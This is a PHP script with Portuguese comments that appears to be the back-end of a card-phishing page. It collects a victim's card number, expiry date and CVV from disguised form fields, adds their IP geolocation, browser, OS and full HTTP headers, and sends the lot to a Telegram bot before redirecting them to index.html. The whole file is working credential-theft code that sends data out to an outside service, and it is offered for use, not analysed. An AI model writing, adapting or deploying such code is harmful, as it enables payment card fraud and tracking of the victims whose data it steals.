<?php
// Inicia buffer para evitar erros de header já enviados
ob_start();

/**
 * Obtém informações de geolocalização a partir de um IP via ip-api.com,
 * retornando valores padrão em caso de falha.
 */
function getIpInfo(string $ip): array {
    $apiUrl  = "http://ip-api.com/json/{$ip}";
    $apiData = @file_get_contents($apiUrl); // Suprime warnings com @ 8
    if ($apiData === false) {
        return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
    }
    $data = json_decode($apiData, true);     // Decodifica JSON para array 9
    if (!isset($data['status']) || $data['status'] !== 'success') {
        return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
    }
    return $data;
}

/**
 * Detecta SO e navegador a partir do User-Agent.
 */
function detectClient(string $ua): array {
    $os = 'Desconhecido';
    if (stripos($ua, 'Windows') !== false)    $os = 'Windows';
    elseif (stripos($ua, 'Android') !== false) $os = 'Android';
    elseif (stripos($ua, 'Linux') !== false)   $os = 'Linux';
    elseif (stripos($ua, 'Mac') !== false)     $os = 'macOS';
    elseif (stripos($ua, 'iPhone') !== false)  $os = 'iOS';

    $browser = 'Desconhecido';
    if (stripos($ua, 'Firefox') !== false)   $browser = 'Firefox';
    elseif (stripos($ua, 'MSIE') !== false ||
            stripos($ua, 'Trident') !== false) $browser = 'Internet Explorer';
    elseif (stripos($ua, 'Edge') !== false)    $browser = 'Microsoft Edge';
    elseif (stripos($ua, 'Chrome') !== false)  $browser = 'Google Chrome';
    elseif (stripos($ua, 'Safari') !== false)  $browser = 'Safari';
    elseif (stripos($ua, 'Opera') !== false ||
            stripos($ua, 'OPR') !== false)      $browser = 'Opera';

    return [$os, $browser];
}

/**
 * Envia mensagem ao Telegram usando cURL.
 */
function sendToTelegram(string $botToken, string $chatId, string $message): bool {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = ['chat_id'=>$chatId, 'text'=>$message];
    $ch = curl_init($url);                     // Inicia cURL 10
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Retorna resposta
    $response = curl_exec($ch);               // Executa sessão 11
    if ($response === false) {
        error_log("cURL Error: " . curl_error($ch));
        curl_close($ch);
        return false;
    }
    curl_close($ch);
    return true;
}

// Processo principal
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Campos do formulário
    $num   = trim($_POST['campoNome']  ?? '');
    $val   = trim($_POST['campoTel']   ?? '');
    $cvv   = trim($_POST['campoTel2']  ?? '');

    if ($num === '' || $val === '' || $cvv === '') {
        echo 'Por favor, preencha todos os campos.';
        ob_end_flush();
        exit;
    }

    // IP real do usuário (proxy-aware) 12
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip  = trim($ips[0]);
    } else {
        $ip  = $_SERVER['REMOTE_ADDR'];
    }

    // Coleta dados básicos
    $ua    = $_SERVER['HTTP_USER_AGENT']      ?? 'N/A';
    $lang  = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'N/A';
    $info  = getIpInfo($ip);
    [$os, $browser] = detectClient($ua);
    $headers = getallheaders();              // Todos os cabeçalhos 13
    $now    = date('Y-m-d H:i:s');

    // Monta mensagem
    $msg  = "☠️ | LOG DE TESTE\n";
    $msg .= "💳 Número: {$num}\n📅 Validade: {$val}\n🔑 CVV: {$cvv}\n\n";
    $msg .= "🏠 IP: {$info['query']}\n🔎 Cidade: {$info['city']}\n";
    $msg .= "📍 Região: {$info['regionName']}\n🌎 País: {$info['country']}\n";
    $msg .= "📦 ISP: {$info['isp']}\n\n";
    $msg .= "🖥 OS: {$os}\n🌐 Navegador: {$browser}\n";
    $msg .= "🗣 Linguagem: {$lang}\n📆 Data/Hora: {$now}\n\n";
    $msg .= "📥 Cabeçalhos HTTP:\n";
    foreach ($headers as $k => $v) {
        $msg .= " - {$k}: {$v}\n";
    }

    // Credenciais do Telegram via ambiente 14
    $token  = getenv('BOT_TOKEN') ?: '';
    $chatId = getenv('CHAT_ID')   ?: '';

    if (sendToTelegram($token, $chatId, $msg)) {
        header('Location: index.html');
        exit;
    } else {
        echo 'Houve um erro ao enviar os dados. Tente novamente.';
    }

} else {
    header('Location: index.html');
    exit;
}

ob_end_flush();